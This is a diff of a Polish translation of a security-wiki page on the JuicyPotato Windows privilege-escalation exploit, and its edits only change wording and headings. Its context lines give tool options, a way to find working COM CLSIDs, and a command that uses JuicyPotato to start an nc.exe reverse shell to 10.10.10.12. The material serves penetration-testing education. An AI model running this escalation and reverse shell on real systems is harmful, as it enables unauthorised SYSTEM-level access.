@@ -26,7 +26,7 @@ Postanowiliśmy uzbroić [RottenPotatoNG](https://github.com/breenmachine/Rotten
 
 Odkryliśmy, że oprócz `BITS` istnieje kilka serwerów COM, które możemy wykorzystać. Muszą one tylko:
 
-1. być instancjonowane przez bieżącego użytkownika, zazwyczaj „użytkownika usługi”, który ma uprawnienia do impersonacji
+1. być instancjonowalne przez bieżącego użytkownika, zazwyczaj „użytkownika usługi”, który ma uprawnienia do impersonacji
 2. implementować interfejs `IMarshal`
 3. działać jako użytkownik z podwyższonymi uprawnieniami (SYSTEM, Administrator, …)
 
@@ -36,10 +36,10 @@ Po kilku testach uzyskaliśmy i przetestowaliśmy obszerną listę [interesując
 
 JuicyPotato pozwala Ci:
 
-- **Cel CLSID** _wybierz dowolny CLSID, który chcesz._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _możesz znaleźć listę uporządkowaną według systemu operacyjnego._
+- **Cel CLSID** _wybierz dowolny CLSID, który chcesz._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _możesz znaleźć listę zorganizowaną według systemu operacyjnego._
 - **Port nasłuchujący COM** _zdefiniuj preferowany port nasłuchujący COM (zamiast twardo zakodowanego 6666)_
 - **Adres IP nasłuchujący COM** _przypisz serwer do dowolnego adresu IP_
-- **Tryb tworzenia procesu** _w zależności od uprawnień użytkownika impersonowanego możesz wybierać spośród:_
+- **Tryb tworzenia procesu** _w zależności od uprawnień użytkownika, którego impersonujesz, możesz wybierać spośród:_
 - `CreateProcessWithToken` (wymaga `SeImpersonate`)
 - `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
 - `oba`
@@ -66,9 +66,9 @@ Optional args:
 -k <ip>: RPC server ip address (default 127.0.0.1)
 -n <port>: RPC server listen port (default 135)
 ```
-### Ostateczne myśli <a href="#final-thoughts" id="final-thoughts"></a>
+### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**Z Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
+[**Z readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
 
 Jeśli użytkownik ma uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`, to jesteś **SYSTEM**.
 
@@ -78,11 +78,11 @@ Rzeczywistym rozwiązaniem jest ochrona wrażliwych kont i aplikacji, które dzi
 
 Z: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
-## Przykłady
+## Examples
 
-Uwaga: Odwiedź [tę stronę](https://ohpe.it/juicy-potato/CLSID/), aby zobaczyć listę CLSID-ów do wypróbowania.
+Note: Odwiedź [tę stronę](https://ohpe.it/juicy-potato/CLSID/) w celu uzyskania listy CLSID-ów do wypróbowania.
 
-### Uzyskaj powłokę odwrotną nc.exe
+### Get a nc.exe reverse shell
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -105,7 +105,7 @@ c:\Users\Public>
 
 ## Problemy z CLSID
 
-Często domyślny CLSID, który używa JuicyPotato, **nie działa** i exploit się nie powodzi. Zazwyczaj wymaga to wielu prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do przetestowania dla konkretnego systemu operacyjnego, powinieneś odwiedzić tę stronę:
+Często domyślny CLSID, który używa JuicyPotato, **nie działa** i exploit się nie powodzi. Zwykle potrzeba wielu prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do przetestowania dla konkretnego systemu operacyjnego, powinieneś odwiedzić tę stronę:
 
 {{#ref}}
 https://ohpe.it/juicy-potato/CLSID/
@@ -115,9 +115,9 @@ https://ohpe.it/juicy-potato/CLSID/
 
 Najpierw będziesz potrzebować kilku plików wykonywalnych oprócz juicypotato.exe.
 
-Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i uruchom [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt stworzy listę możliwych CLSID do przetestowania.
+Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i uruchom [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę możliwych CLSID do przetestowania.
 
-Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(zmień ścieżkę do listy CLSID i do pliku wykonywalnego juicypotato) i uruchom go. Zacznie próbować każdy CLSID, a **gdy numer portu się zmieni, oznacza to, że CLSID zadziałał**.
+Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (zmień ścieżkę do listy CLSID i do pliku wykonywalnego juicypotato) i uruchom go. Zacznie próbować każdy CLSID, a **gdy numer portu się zmieni, oznacza to, że CLSID zadziałał**.
 
 **Sprawdź** działające CLSID **używając parametru -c**
 
